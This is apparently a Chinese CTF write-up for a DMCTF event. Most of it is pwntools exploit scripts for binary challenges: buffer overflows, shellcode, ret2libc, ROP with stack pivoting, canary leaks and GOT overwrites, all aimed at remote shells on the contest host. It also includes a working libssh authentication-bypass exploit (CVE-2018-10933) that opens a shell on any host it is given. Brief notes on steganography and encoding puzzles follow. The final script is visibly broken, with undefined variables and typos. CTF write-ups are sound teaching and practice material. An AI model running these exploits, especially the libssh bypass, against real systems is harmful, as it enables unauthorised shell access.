# PWN-intoverflow

`intoverflow`

整数溢出才能到`strcpy`，控制返回地址到`backdoor`

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
#context.arch="amd64"
local=0

if local:
	p=process('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28484)
elf = ELF('./pwn')
#gdb.attach(p)
backdoor=0x08048645
payload='a'*0x15+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)+p32(backdoor)#不放心多输入几个
payload=payload.ljust(261,'a')
p.send(payload)

p.interactive()
```

# PWN-stackoverflow

`stackoverflow`

溢出到`backdoor`

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28496)
#elf = ELF('./pwn')
payload='a'*0x10+'a'*0x8+p64(0x04006BA)
p.send(payload)

p.interactive()
```

# PWN-shellcode

`shellcode`

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./pwn')
	elf = ELF('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28088)
	elf = ELF('./pwn')

shellcode=asm(shellcraft.amd64.sh())
ret=int(p.recvline()[:-1],16)
print(ret)
payload=shellcode.ljust(0x90,'a')+'a'*0x8+p64(ret)
p.send(payload)

p.interactive()
```

# PWN-Admin Panel

看看第一题（

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
#context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./pwn')
	elf = ELF('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28376)
	elf = ELF('./pwn')

offset=0x19
binsh=0x08048960
system=elf.plt['system']
#gdb.attach(p)
p.sendafter('Username','Nhj')
payload='a'*0x19+'a'*0x4+p32(system)+'aaaa'+p32(binsh)
payload=payload.ljust(261,'a')
p.sendafter('Password',payload)

p.interactive()
```

# PWN-SSH

CVE-2018-10993

```python
#!/usr/bin/env python
# coding: utf-8

import sys
import socket
import argparse
import logging

import paramiko
from paramiko.ssh_exception import SSHException


logger = logging.getLogger("CVE-2018-10933")


def main(hostname="127.0.0.1", port=22):

    # Enabling Debug logging
    logging.basicConfig(level=logging.DEBUG)
    
    try:
        logger.debug("Validating TCP/22 reachability.")
        sock = socket.create_connection((hostname, port))
    except socket.error as e:
        print('[-] Connecting to host failed. Please check the specified host and port')
        return 1

    # instantiate transport
    m = paramiko.message.Message()
    transport = paramiko.transport.Transport(sock)

    try:
        logger.debug("Attempting to start SSH client.")
        transport.start_client()

        logger.debug("Sending USERAUTH_SUCCESS message.")
        m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(m)

        logger.debug("Attempting to open an SSH session.")
        cmd_channel = transport.open_session()
        logger.debug("Attempting to invoke a TTY shell.")
        cmd_channel.invoke_shell()
    except SSHException as e:
        print('SSH Exception: {}'.format(e))
        return 1


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="libssh Authentication Bypass (CVE-2018-10933)")

    parser.add_argument('hostname', help='target', type=str)
    parser.add_argument('-p', '--port', help='ssh port (default: 22)', default=22, type=int)

    args = parser.parse_args()

    main(**vars(args))
```

# PWN-shutup

`ROP`+`shellcode`

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
#context.arch="amd64"

local=0

if local:
	p=process('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28112)

elf = ELF('./pwn')
#gdb.attach(p)

bss=0x0804A040
read=elf.plt['read']
shellcode=asm(shellcraft.sh())
payload='a'*0x18+p32(bss)+p32(read)+p32(bss)+p32(0)+p32(bss)+p32(len(shellcode))+p32(bss)
p.send(payload)
sleep(0.1)
payload=shellcode
p.send(payload)

p.interactive()
```

# PWN-babystack

`ret2libc_init`

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28272)
elf = ELF('./pwn')
#gdb.attach(p)
write_plt=elf.plt['write']
write_got=elf.got['write']
puts_got=elf.got['puts']
read_got=elf.got['read']
libc_csu_pop=0x40065A
libc_csu_mov=0x400640
main=0x4005B6
pop_rdi=0x400663
def csu(rbx,rbp,r12,r13,r14,r15,last):
	payload ='a'*16+'b'*8
	payload+=p64(libc_csu_pop)
	payload+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
	payload+=p64(libc_csu_mov)+'a'*56+p64(last)
	p.send(payload)

p.recvuntil('PWNME,PWNME,PWMME!!!\n')
csu(0,1,write_got,8,write_got,1,main)
write_addr = u64(p.recv(8))
print hex(write_addr)

libcbase=write_addr-0x0f72b0
system=libcbase+0x045390
bin_sh=libcbase+0x18cd57

p.recvuntil('PWNME,PWNME,PWMME!!!\n')
payload ='a'*16+'a'*8
payload+=p64(pop_rdi)+p64(bin_sh)+p64(system)
p.send(payload)

p.interactive()
```

# PWN-easystack

`stack pivoting`+`ROP`

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28385)

elf = ELF('./pwn')
libc=ELF('./libc.so.6')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
read_got=elf.got['read']
pop_rdi=0x400803
leave_ret=0x40071f
#gdb.attach(p)
fake_stack=0x601160
pwn_addr=0x04006E0

#one
payload=p64(fake_stack-0x100-8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pwn_addr)
p.sendafter("What's your name?",payload)

#two
payload=p64(fake_stack-0x100-8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pwn_addr)
p.sendafter("Want leave something?",payload)

#buf
payload='a'*0x10+p64(fake_stack)+'\x1f'
p.sendafter('So, Bye?',payload)
p.recvline()
puts_addr=u64(p.recv(6).ljust(8,'\x00'))
print hex(puts_addr)

libcbase=puts_addr-libc.symbols['puts']
system=libcbase+libc.sym['system']
binsh=libcbase+0x1b3e1a
one=libcbase+0x4f432#0x4f3d5   #0x4f432   0x10a41c
print hex(system)

payload=p64(one)+p64(binsh)+p64(system)+p64(pop_rdi)+p64(binsh)+p64(system)
p.sendafter("Want leave something?",payload)
payload=p64(pop_rdi)+p64(binsh)+p64(system)
p.sendafter('So, Bye?',payload)

p.interactive()
```

# PWN-Flag-Shop

`overwrite`+`ROP`

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28059)

#elf = ELF('./pwn')
#gdb.attach(p)
sh=0x602080+15
system=0x400910
sprintf=0x400C33
pop_rdi=0x400e03

p.sendlineafter('6. Exit','5')
padding='a'*(0x50-0x11)
payload=padding+p64(0)
payload=payload.ljust(0x58,'a')+p64(sprintf)+'\n'
p.send(payload)
p.sendlineafter('6. Exit','1')
sleep(0.1)
payload='a'*0x50+'a'*8+p64(pop_rdi)+p64(sh)+p64(system)+'\n'
p.send(payload)
p.sendlineafter('6. Exit','6')

p.interactive()
```

# PWN-马大师的绝招

`leak canary`+`ROP`

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28431)
elf = ELF('./pwn')
#gdb.attach(p)
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
read_got=elf.got['read']
pop_rdi=0x4008f3
vul=0x04007B0

p.recvuntil("go go go !!!!!!!\n")
p.send('%15$p')
canary=int(p.recv(18),16)
print hex(canary)

payload='a'*(0x40-8)+p64(canary)+'a'*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vul)
p.sendafter('get flag!!!',payload)

p.recvline()
puts_addr=u64(p.recv(8).ljust(8,'\x00'))
print('this is puts_addr:')
print hex(puts_addr)

libcbase=puts_addr-0x06f6a0
system=libcbase+0x0453a0
binsh=libcbase+0x18ce17
p.send('%15$p')
#p.recvuntil("go go go !!!!!!!\n ")
sleep(0.1)
canary=int(p.recv(19),16)
print hex(canary)

one=libcbase+0x45226  #0x45226   0x4527a     0xf0364     0xf1207
payload='a'*(0x40-8)+p64(canary)+'a'*0x8+p64(one)
p.sendafter('get flag!!!',payload)

p.interactive()
```

# PWN-接化发

`GOT Hijacking`

写写思路：

年轻人你的名字是：“/bin/sh\x00”

接-->修改buf指向的地址，化-->修改buf地址上的内容，发1-->输出buf指向地址上的地址的1字节数据，发2-->向buf指向位置写1字节数据

修改buf的值为puts_got,然后putchar来leak libc。libc出来找system，修改printf的got表为system地址。

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

local=0
#gdb.attach(p)
if local:
	p=process('./pwn')
else:
	p=remote('dmctf.vaala.cloud',28431)
elf = ELF('./pwn')

pwn=0x602120
stdin=0x6020b0
printf=elf.got['printf']
for i in range(pwn-stdin):
	p.recvuntil('>\n')
	p.sendline('2')
	
addr=''
for i in range(6):
	p.recvuntil('>\n')
	p.sendline('5')
	addr+=p.recv(1)
	p.recvuntil('>\n')
	p.sendline('1')

addr=u64(addr.ljust(8,'\x00'))
log.info('stdin_addr:'+addr)
libc=LibcSearcher('puts',puts_addr)
base=puts_addr-libc.dump('puts')

system=base+libc.dump('system')

for i in range(stdin-printf+6):
	p.recvuntil('>\n')
	p.sendline('2')
	
for i in range(5):
	p.recvuntil('>\n')
	p.sendline('6')
	p.send(str(system[i]))
	p.recvuntil('>\n')
	p.sendline('1')
	
p.recvuntil('>\n')
p.sendline('6')
p.send(str(system[5]))

p.sendlien('7')

p.interactive()
```



# MISC-simpleQrcode

就硬扫，honey view真好用。

# MISC-check in

。。。

# MISC-fake zip

winrar直接就修复了，然后百度音符解密。

# MISC-Basefamily

就是看basexx编码的特点，看少什么字符是什么base。

# MISC-Silenteye

用silenteye解，提取出来之后还是个编码，百度就出来了。

# MISC-编码之王

价值观编码-->与佛伦禅-->新佛-->jsfuck在线运行

# MISC-Collision

crc32碰撞，github脚本直接跑。

# MISC-outguess

用outguess解，出来一个凯撒密码，和AES。凯撒解密出来提示key。

# MISC-steghide

用steghide解，得到ook编码，替换为正的。

# MISC-SSTV

用MMSSTV直接听。

# RE

零解。。。